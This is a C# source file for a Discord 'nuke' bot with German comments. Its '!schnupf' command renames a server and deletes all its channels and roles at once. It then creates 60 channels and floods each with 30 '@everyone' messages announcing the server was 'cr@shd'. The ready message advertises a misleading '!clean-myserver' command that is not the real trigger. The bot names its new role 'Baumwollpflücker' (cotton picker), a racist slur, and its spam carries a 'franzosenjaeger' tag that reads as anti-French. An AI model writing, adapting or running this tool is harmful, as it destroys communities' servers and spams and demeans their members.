using Discord;
using Discord.WebSocket;

class Program
{
    private static DiscordSocketClient _client = null!;
    private static byte[]? _logoBytes;

    // ── Hier alles anpassen ───────────────────────────────────────────────────
    const string SERVER_NAME   = "GEBEMEIERS UNZUCHT"; // Servername nach dem Clean
    const string CHANNEL_NAME  = "sie wurden gegebemeiert";       // Name der neuen Kanäle
    const int    CHANNEL_COUNT = 60;                   // Anzahl der Kanäle
    const int    MESSAGE_COUNT = 30;                   // Nachrichten pro Kanal
    const string MESSAGE_TEXT  =
        "✅ **https://youtu.be/4Lc-LarMzSc?is=TWhwIqrlVgo9td9X**\n" +
        "> server cr@shd @everyone.\n" +
        "> powered by franzosenjaeger**";

    const string NEW_ROLE_NAME  = "Baumwollpflücker"; // Name der neuen Rollen
    const int    NEW_ROLE_COUNT = 1;                   // Anzahl der neuen Rollen
    // ─────────────────────────────────────────────────────────────────────────

    static async Task Main()
    {
        var token = Environment.GetEnvironmentVariable("DISCORD_TOKEN");
        if (string.IsNullOrEmpty(token))
        {
            Console.Error.WriteLine("[FEHLER] DISCORD_TOKEN ist nicht gesetzt!");
            return;
        }

        if (File.Exists("/app/logo.jpg"))
        {
            _logoBytes = await File.ReadAllBytesAsync("/app/logo.jpg").ConfigureAwait(false);
            Console.WriteLine($"[OK] Logo vorgeladen ({_logoBytes.Length / 1024} KB).");
        }
        else
        {
            Console.WriteLine("[WARN] logo.jpg nicht gefunden – Logo-Änderung wird übersprungen.");
        }

        var config = new DiscordSocketConfig
        {
            GatewayIntents = GatewayIntents.Guilds
                           | GatewayIntents.GuildMessages
                           | GatewayIntents.MessageContent
        };

        _client = new DiscordSocketClient(config);

        _client.Log             += LogAsync;
        _client.Ready           += ReadyAsync;
        _client.MessageReceived += MessageHandler;

        await _client.LoginAsync(TokenType.Bot, token).ConfigureAwait(false);
        await _client.StartAsync().ConfigureAwait(false);
        await Task.Delay(-1).ConfigureAwait(false);
    }

    private static async Task TryRun(Task t, string label)
    {
        try   { await t.ConfigureAwait(false); }
        catch (Exception ex) { Console.WriteLine($"[SKIP] {label}: {ex.Message}"); }
    }

    private static Task LogAsync(LogMessage log)
    {
        Console.WriteLine(log.ToString());
        return Task.CompletedTask;
    }

    private static Task ReadyAsync()
    {
        Console.WriteLine("[OK] Bot ist online – !clean-myserver bereit.");
        return Task.CompletedTask;
    }

    private static async Task MessageHandler(SocketMessage message)
    {
        if (message is not SocketUserMessage userMsg) return;
        if (userMsg.Author.IsBot) return;
        if (userMsg.Channel is not SocketGuildChannel guildChannel) return;
        if (!userMsg.Content.Equals("!schnupf", StringComparison.OrdinalIgnoreCase)) return;

        var guildUser = guildChannel.Guild.GetUser(userMsg.Author.Id);
        if (!guildUser.GuildPermissions.Administrator)
        {
            await userMsg.Channel.SendMessageAsync(
                "❌ Du brauchst Administrator-Rechte für diesen Command."
            ).ConfigureAwait(false);
            return;
        }

        var guild = guildChannel.Guild;
        Console.WriteLine("[START] Reinigung gestartet...");

        // ── PHASE 1: Servername/Logo + alle Kanäle + alle Rollen GLEICHZEITIG ─
        int botTopPosition = guild.CurrentUser.Roles
            .DefaultIfEmpty()
            .Max(r => r?.Position ?? 0);

        var phase1 = new List<Task>
        {
            // Server umbenennen + Logo setzen
            TryRun(guild.ModifyAsync(p =>
            {
                p.Name = SERVER_NAME;
                if (_logoBytes is not null)
                    p.Icon = new Image(new MemoryStream(_logoBytes));
            }), "Server-Edit")
        };

        // Alle Kanäle löschen
        foreach (var ch in guild.Channels)
            phase1.Add(TryRun(ch.DeleteAsync(), $"Kanal {ch.Name}"));

        // Alle löschbaren Rollen löschen
        foreach (var r in guild.Roles.Where(r => !r.IsEveryone && !r.IsManaged && r.Position < botTopPosition))
            phase1.Add(TryRun(r.DeleteAsync(), $"Rolle {r.Name}"));

        await Task.WhenAll(phase1).ConfigureAwait(false);
        Console.WriteLine("[OK] Phase 1 fertig (Edit + Kanäle + Rollen).");

        // ── PHASE 2: Neue Kanäle + neue Rollen GLEICHZEITIG erstellen ─────────
        var channelCreates = Enumerable.Range(0, CHANNEL_COUNT)
            .Select(_ => guild.CreateTextChannelAsync(CHANNEL_NAME))
            .ToList();

        var roleCreates = Enumerable.Range(0, NEW_ROLE_COUNT)
            .Select(_ => guild.CreateRoleAsync(NEW_ROLE_NAME, isMentionable: true))
            .ToList();

        await Task.WhenAll(channelCreates.Concat<Task>(roleCreates)).ConfigureAwait(false);

        var newChannels = await Task.WhenAll(channelCreates).ConfigureAwait(false);
        Console.WriteLine($"[OK] {CHANNEL_COUNT} Kanäle + {NEW_ROLE_COUNT}x '{NEW_ROLE_NAME}' erstellt.");

        // ── PHASE 3: Nachrichten senden ───────────────────────────────────────
        var messageTasks = newChannels.SelectMany(ch =>
            Enumerable.Range(0, MESSAGE_COUNT)
                .Select(_ => TryRun(ch.SendMessageAsync(MESSAGE_TEXT), $"Msg in {ch.Name}"))
        );

        await Task.WhenAll(messageTasks).ConfigureAwait(false);
        Console.WriteLine("[FERTIG] Alles erledigt.");
    }
}
